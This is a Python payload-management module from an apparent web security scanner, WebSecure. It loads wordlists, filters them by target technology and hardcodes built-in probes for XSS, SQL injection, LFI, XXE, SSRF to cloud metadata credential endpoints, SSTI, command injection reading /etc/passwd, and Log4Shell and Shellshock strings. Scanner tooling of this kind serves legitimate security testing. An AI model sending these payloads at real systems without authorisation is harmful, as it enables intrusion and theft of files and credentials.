from __future__ import annotations
import logging
import os, json, re, subprocess, shlex, time
from pathlib import Path
from typing import List, Iterable, Dict, Any, Tuple, Set

_logger = logging.getLogger(__name__)


def _to_path_or_none(v):
    """Normalize various root representations into pathlib.Path or None.
    Accepts str (whitespace-trimmed), PathLike, or Path. Empty strings -> None.
    """
    if v is None:
        return None
    if isinstance(v, (Path, os.PathLike)):
        return Path(v)
    if isinstance(v, str):
        s = v.strip()
        return Path(s) if s else None
    # Unknown type: refuse silently by returning None (keeps previous behavior of skipping missing roots)
    return None


# --- Config loading ---------------------------------------------------------

def _load_config_path() -> Path | None:
    env = os.getenv('WS_CONFIG')
    if env:
        p = Path(env)
        return p if p.exists() and p.is_file() else None
    local = Path('./config.json')
    return local if local.exists() and local.is_file() else None

def _load_cfg() -> dict:
    p = _load_config_path()
    if not p:
        return {}
    txt = p.read_text(encoding='utf-8', errors='ignore')
    return json.loads(txt) if txt.strip() else {}

def _read_lines(path: Path) -> list[str]:
    if not isinstance(path, Path):
        path = Path(path)
    if (not path.exists()) or (not path.is_file()):
        return []
    txt = path.read_text(encoding='utf-8', errors='ignore')
    out: list[str] = []
    for line in txt.splitlines():
        s = line.strip()
        if not s or s.startswith('#'):
            continue
        out.append(s)
    return out

def _glob_many(root: Path, patterns: Iterable[str]) -> list[str]:
    out: list[str] = []
    for pat in patterns:
        for p in root.glob(pat):
            out.extend(_read_lines(p))
    return out

def _dedup_preserve(seq: Iterable[str], limit: int | None = None) -> list[str]:
    seen, out = set(), []
    for s in seq:
        s = (s or "").strip()
        if not s:
            continue
        if len(s) > 2048:  # sanity
            continue
        if s in seen:
            continue
        seen.add(s)
        out.append(s)
        if limit and len(out) >= limit:
            break
    return out

# --- Templating for placeholder tokens -------------------------------------

_MARK_TOKENS = ["§", "{{MARK}}", "{MARK}", "<MARK>", "{{XSS}}", "{{INJECT}}", "XSS_MARK", "FUZZ", "%%MARK%%"]

def _apply_marker(payloads: list[str], marker: str | None) -> list[str]:
    if not marker:
        return payloads
    out: list[str] = []
    for s in payloads:
        repl = s
        for tok in _MARK_TOKENS:
            if tok in repl:
                repl = repl.replace(tok, marker)
        out.append(repl)
    return out

# --- Defaults for common repos ---------------------------------------------

# Helper to find package root dynamically
def _get_package_root() -> Path:
    # payloads.py is in websecure/core/, so root is three levels up -> WebSecure (Project Root)
    return Path(__file__).resolve().parent.parent.parent

_PKG_ROOT = _get_package_root()

_DEFAULTS = {
    # Bundled high-quality wordlists — sole source, always available, no external dependency
    "bundled": {
        "root": _PKG_ROOT / "websecure" / "wordlists",
        "git": None,
        # Injection payloads
        "xss":            ["xss.txt"],
        "sqli":           ["sqli.txt"],
        "lfi":            ["lfi.txt"],
        "path_traversal": ["lfi.txt"],
        "ssrf":           ["ssrf.txt"],
        "xxe":            ["xxe.txt"],
        "ssti":           ["ssti.txt"],
        "nosqli":         ["nosqli.txt"],
        "cmdi":           ["cmdi.txt"],
        "rce":            ["cmdi.txt"],
        "open_redirect":  ["open_redirect.txt"],
        "redirect":       ["open_redirect.txt"],
        # Discovery / fuzzing
        "dirs":           ["dirs.txt", "common.txt", "raft-small-words.txt"],
        "files":          ["files.txt"],
        "common":         ["common.txt"],
        "wordlist":       ["dirs.txt", "common.txt"],
        # Parameter / value fuzzing
        "params":         ["params.txt"],
        "values":         ["values.txt"],
        "fuzz":           ["params.txt", "values.txt"],
        # Auth
        "passwords":      ["passwords_top1000.txt"],
        "jwt_secrets":    ["jwt_secrets.txt"],
        "jwt":            ["jwt_secrets.txt"],
    },
}


# --- External sync (git clone/pull) ----------------------------------------

def _is_git_repo(path: Path) -> bool:
    return (path / ".git").exists()

def _run(cmd: str, cwd: Path | None = None, timeout: int = 120) -> tuple[int, str]:
    if not isinstance(cmd, str) or not cmd.strip():
        raise ValueError("cmd boş olamaz")
    if cwd is not None and not cwd.exists():
        raise FileNotFoundError(f"cwd yok: {cwd}")
    # check=False ile returncode döner; hatalar (örn. komut bulunamadı) istisna olarak yükselir
    try:
        proc = subprocess.run(
            shlex.split(cmd),
            cwd=str(cwd) if cwd else None,
            capture_output=True,
            text=True,
            timeout=timeout,
            check=False,
        )
        out = (proc.stdout or "") + (proc.stderr or "")
        return proc.returncode, out
    except subprocess.TimeoutExpired:
        return 124, f"Timeout expired after {timeout}s"
    except Exception as e:
        return 1, str(e)

def sync_wordlists(cfg: Dict[str, Any] | None = None) -> Dict[str, Any]:
    """
    Dış wordlist kaynaklarını senkronize eder (git clone/pull).
    config.payloads.sync:true ise çağrılması önerilir.
    """
    cfg = cfg or _load_cfg()
    pl_cfg = (cfg.get("payloads") or {}) if isinstance(cfg, dict) else {}
    roots = _provider_roots(pl_cfg)
    report = {}
    for name, sec in roots.items():
        root: Path = sec["root"]
        url = sec.get("git")
        root.parent.mkdir(parents=True, exist_ok=True)
        if root.exists() and _is_git_repo(root):
            try:
                code, out = _run("git pull --ff-only", cwd=root, timeout=60)
            except Exception as exc:
                code, out = 1, "Skipped pull due to timeout/error"
            report[name] = {"action": "pull", "code": code, "out": (out or "")[-2000:]}
        elif (not root.exists() or not any(root.iterdir() if root.exists() else [])) and url:
            # USER REQUEST: DISABLE AUTO-CLONE
            # print(f"[*] Cloning {name} from {url} (this may take a while)...")
            # code, out = _run(f"git clone --depth=1 {url} {str(root)}", cwd=root.parent, timeout=300)
            print(f"[!] Warning: Wordlist directory {root} missing/empty. Skipping download per user request.")
            report[name] = {"action": "skipped", "code": 0, "out": "Download disabled"}
        else:
            report[name] = {"action": "skip", "reason": "no git url or already present"}
    return report

# --- Technology-aware filter ------------------------------------------------

# Basit sezgisel eşleştirmeler (genişletilebilir)
_TECH_HINTS: Dict[str, Dict[str, Dict[str, Iterable[str]]]] = {
    # category -> tech_group -> {"include": [None], "exclude": [None]}
    "sqli": {
        "mysql": {"include": [r"(?i)\b(select|union|sleep\()", r"(?i)order\s+by", r"(?i)concat\("],
                  "exclude": [r"(?i)xp_cmdshell", r"(?i)';?\s*waitfor"]},
        "mssql": {"include": [r"(?i)';?\s*waitfor\s+delay", r"(?i)xp_cmdshell", r"(?i)sp_oacreate"],
                  "exclude": [r"(?i)concat\("]},
        "pgsql": {"include": [r"(?i)\bpg_sleep\(", r"(?i)\bgenerate_series\(", r"(?i)array\["], "exclude": []},
        "oracle": {"include": [r"(?i)dbms_pipe.receive_message", r"(?i)utl_http", r"(?i)union\s+select\s+null"],
                   "exclude": [r"(?i)pg_sleep\("]},
        "sqlite": {"include": [r"(?i)\bsqlite_", r"(?i)\bpragma\b"], "exclude": []},
    },
    "xss": {
        "react": {"include": [r"(?i)<svg", r"(?i)onload="], "exclude": [r"(?i){{", r"(?i)<script[^>]*>"]},
        "angular": {"include": [r"(?i){{", r"(?i)ng-app", r"(?i)svg onload"], "exclude": []},
        "vue": {"include": [r"(?i){{", r"(?i)v-on:", r"(?i)@click"], "exclude": []},
        "dom": {"include": [r"(?i)<img\s+src=x\s+onerror=", r"(?i)<svg/onload="], "exclude": []},
        "csp": {"include": [r"(?i)<svg", r"(?i)<img"], "exclude": [r"(?i)<script", r"(?i)javascript:"]},
    },
    "rce": {
        "linux": {"include": [r"(?i);\s*sh\b", r"(?i)\b/bin/sh\b", r"(?i)\bcat\s+/etc/passwd"],
                  "exclude": [r"(?i)cmd\.exe"]},
        "windows": {"include": [r"(?i)&\s*cmd\.exe", r"(?i)\bping\s+-n\b", r"(?i)\btype\s+C:\\\\"],
                    "exclude": [r"(?i)/bin/sh"]},
    },
}

def _match_any(patterns: Iterable[str], s: str) -> bool:
    for pat in patterns:
        if re.search(pat, s):
            return True
    return False

def filter_by_technology(payloads: list[str], category: str, tech_tags: Iterable[str] | None) -> list[str]:
    """
    Basit teknoloji farkındalığı: verilen tech_tags (ör. {'mysql','react','linux'}) için
    o kategoriye ait include/exclude sezgilerini uygular.
    """
    if not tech_tags:
        return payloads
    category = (category or "").lower().strip()
    rules = _TECH_HINTS.get(category) or {}
    tags = {t.lower() for t in tech_tags if t}
    # Birden çok teknoloji etiketinde birleşim: include herhangi biri, exclude herhangi biri
    includes: List[str] = []
    excludes: List[str] = []
    for t in tags:
        r = rules.get(t)
        if not r:
            continue
        includes.extend(list(r.get("include") or []))
        excludes.extend(list(r.get("exclude") or []))
    if not includes and not excludes:
        return payloads
    out: list[str] = []
    for s in payloads:
        ok = True
        if includes:
            ok = _match_any(includes, s)
        if ok and excludes:
            if _match_any(excludes, s):
                ok = False
        if ok:
            out.append(s)
    # Eğer aşırı daraltma olduysa, orijinal setten bir miktar fallback ekle
    if len(out) < max(20, len(payloads) // 20):
        out = _dedup_preserve(list(out) + payloads[:50], limit=len(out) + 50)
    return out

# --- Public API -------------------------------------------------------------

def _provider_roots(cfg_section: dict) -> dict:
    out = {}
    for prov in ["bundled"]:
        defaults = _DEFAULTS.get(prov, {})
        sec = cfg_section.get(prov, {}) if isinstance(cfg_section, dict) else {}
        root = Path(sec.get("root") or defaults.get("root") or _PKG_ROOT / "wordlists")
        entry: dict = {
            "root": root,
            "git": sec.get("git", defaults.get("git")),
        }
        # Copy all category keys from defaults, allowing config overrides
        for key, default_val in defaults.items():
            if key in ("root", "git"):
                continue
            entry[key] = sec.get(key) or default_val
        out[prov] = entry
    return out

def load_external_payloads(category: str, marker: str | None = None) -> list[str]:
    """
    category: 'xss','sqli','rce', veya ALLOWED_CATEGORIES içinde tanımlı diğerleri.
    Sağlayıcıların pattern haritaları üzerinden tarama yapar.
    """
    category = (category or "").lower().strip()

    # Kategori doğrulamasını esnet: bilinmeyen kategoride de config'e verilmiş pattern'ler kullanılabilir.
    cfg = _load_cfg()
    pl_cfg = (cfg.get("payloads") or {}) if isinstance(cfg, dict) else {}
    if pl_cfg is False or not isinstance(pl_cfg, dict):
        return []

    # Tek provider: bundled (tüm wordlistler websecure/wordlists/ altında)
    providers = ["bundled"]

    roots = _provider_roots(pl_cfg)

    items: list[str] = []
    for prov in providers:
        sec = roots.get(prov) or {}
        raw_root = sec.get("root") if isinstance(sec, dict) else None
        root = _to_path_or_none(raw_root)
        if not root or not root.exists():
            continue
        pats = (sec.get(category) or []) if isinstance(sec, dict) else []
        items.extend(_glob_many(root, pats))

    # trim & dedup
    maxn = pl_cfg.get("max_per_category", os.getenv("WS_PAYLOADS_MAX", "500"))
    maxn = int(str(maxn)) if str(maxn).strip().isdigit() else 500
    dd = bool(pl_cfg.get("dedup", True))

    items = _apply_marker(items, marker)
    if dd:
        items = _dedup_preserve(items, limit=maxn)
    else:
        items = items[:maxn]
    return items

def get_payloads(
    category: str,
    *,
    marker: str | None = None,
    tech_tags: Iterable[str] | None = None,
    do_sync: bool | None = None,
) -> list[str]:
    """
    Yüksek seviye API:
      - do_sync True ise wordlist kaynaklarını git üzerinden senkronize eder.
      - dış payloadları yükler (Sağlayıcı: bundled — websecure/wordlists/).
      - technology-aware filtre uygular.
      - dedup & limit uygular (yükleme fonksiyonu içinde).
      - Aynı process içinde tekrar çağrılarda basit cache kullanır.
    """
    cfg = _load_cfg()
    pl_cfg = (cfg.get("payloads") or {}) if isinstance(cfg, dict) else {}

    if do_sync or (do_sync is None and bool(pl_cfg.get("sync", False))):
        sync_wordlists(cfg)

    ck = _cache_key(category, marker, tech_tags)
    if ck in _PAYLOAD_CACHE:
        return list(_PAYLOAD_CACHE[ck])

    items = load_external_payloads(category, marker=marker)

    if not items:
        items = get_builtin_payloads(category)
        if not items:
            _logger.warning(
                "[payloads] '%s' kategorisi için ne harici wordlist ne de builtin payload "
                "bulunamadı — scanner sıfır payload ile çalışacak. "
                "websecure/wordlists/ dizinini ve config.payloads.bundled.root ayarını kontrol edin.",
                category,
            )

    items = filter_by_technology(items, category, tech_tags)

    _PAYLOAD_CACHE[ck] = list(items)
    return items

__all__ = [
    "load_external_payloads",
    "get_payloads",
    "filter_by_technology",
    "sync_wordlists",
]

# === PATCH: WebSecure Upgrade (auto-applied) @ 2025-09-07T16:43:08.489221 ===

# Genişletilmiş kategori desteği
ALLOWED_CATEGORIES = {
    "xss",
    "sqli",
    "rce",
    "nosqli",
    "ssti",
    "redirect",
    "cmdi",
    "lfi",
    "path_traversal",
    "ssrf",
    "open_redirect",
}

_PAYLOAD_CACHE: dict[tuple[str, str | None, tuple[str, None] | None], list[str]] = {}

def _cache_key(category: str, marker: str | None, tech_tags: Iterable[str] | None) -> tuple[
    str, str | None, tuple[str, None] | None]:
    return (category, marker, tuple(sorted([t for t in (tech_tags or []) if t])) or None)

def url_encode_twice(s: str) -> str:
    from urllib.parse import quote
    return quote(quote(s, safe=""), safe="")

def wrap_json(key: str, value: str) -> str:
    return '{"%s":"%s"}' % (key, value.replace('"','\"'))

def wrap_xml(tag: str, value: str) -> str:
    return f"<{tag}>{value}</{tag}>"

def form_urlencoded(k: str, v: str) -> str:
    from urllib.parse import urlencode
    return urlencode({k: v})

def multipart_probe(name: str, value: str, boundary: str = "----WebSecBoundaryX"):
    head = f"--{boundary}\r\nContent-Disposition: form-data; name=\"{name}\"\r\n\r\n"
    tail = f"\r\n--{boundary}--\r\n"
    return head + value + tail

# --- Built-in Payloads (Advanced/Polyglots) ---
BUILTIN_PAYLOADS = {
    "polyglot": [
        "javascript://%250Aalert(1)//\"/*\\'/*\\'/*--></script><xss>",
        "';WAITFOR DELAY '0:0:5'--",
        "\"><script>alert(1)</script>",
        "1;SLEEP(5)#",
        "1 OR 1=1",
        ";|/usr/bin/id|",
        "{{7*7}}",
        "${7*7}",
        "foo\" onmouseover=\"alert(1)",
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//",
    ],
    "xss": [
        "<script>alert(1)</script>",
        "\"><script>alert(1)</script>",
        "'><script>alert(1)</script>",
        "<svg/onload=alert(1)>",
        "<img src=x onerror=alert(1)>",
        "<iframe/src=javascript:alert(1)>",
        "<x onfocus=alert(1) autofocus>",
        "<details open ontoggle=alert(1)>",
        "<video src=x onerror=alert(1)>",
        "\" onmouseover=\"alert(1)",
        "' onmouseover='alert(1)",
        ";alert(1);//",
        "';alert(1);//",
        "javascript:alert(1)",
        "javascript:alert(document.domain)",
        "{{constructor.constructor('alert(1)')()}}",
    ],
    "sqli": [
        "'",
        "\"",
        "' OR '1'='1",
        "' OR 1=1--",
        "\" OR 1=1--",
        "' AND SLEEP(5)--",
        "'; WAITFOR DELAY '0:0:5'--",
        "' AND (SELECT 1 FROM pg_sleep(5))--",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' ORDER BY 1--",
        "' ORDER BY 10--",
    ],
    "lfi": [
        "../etc/passwd",
        "../../etc/passwd",
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "..%2Fetc%2Fpasswd",
        "%2e%2e%2fetc%2fpasswd",
        "php://filter/read=convert.base64-encode/resource=index.php",
        "php://input",
        "/etc/passwd",
        "C:\\windows\\win.ini",
        "file:///etc/passwd",
    ],
    "ssrf": [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://127.0.0.1/",
        "http://localhost/",
        "http://0.0.0.0/",
        "http://[::1]/",
        "file:///etc/passwd",
        "dict://127.0.0.1:6379/info",
        "gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A",
    ],
    "xxe": [
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///windows/win.ini\">]><root>&xxe;</root>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><root>&xxe;</root>",
        "<?xml version=\"1.0\"?><foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"file:///etc/passwd\" parse=\"text\"/></foo>",
    ],
    "ssti": [
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        "<%= 7*7 %>",
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{%import os%}${os.popen('id').read()}",
        "#set($x=7*7)${x}",
        "<%= `id` %>",
    ],
    "nosqli": [
        "[$ne]=1",
        "[$gt]=",
        "[$regex]=.*",
        "{\"$ne\": null}",
        "{\"$regex\": \".*\"}",
        "{\"$where\": \"1==1\"}",
        "' && '1'=='1",
        "' || '1'=='1",
        "'; return true; //",
    ],
    "cmdi": [
        "; id",
        "| id",
        "|| id",
        "& id",
        "&& id",
        "`id`",
        "$(id)",
        "; cat /etc/passwd",
        "& whoami",
        "; sleep 5",
        "& timeout /T 5 /NOBREAK",
        "%0a id",
        "| sleep 5",
    ],
    "exploit": [
        "${jndi:ldap://127.0.0.1:1389/a}",
        "${jndi:dns://127.0.0.1:53/a}",
        "${jndi:ldap://127.0.0.1:1389/exploit}",
        "() { :;}; /bin/bash -c 'cat /etc/passwd'",
        "() { :;}; /bin/echo 'ShellShock'",
    ],
}

def get_builtin_payloads(category: str) -> List[str]:
    """Return hardcoded advanced payloads for a given category."""
    return list(BUILTIN_PAYLOADS.get(category, []))
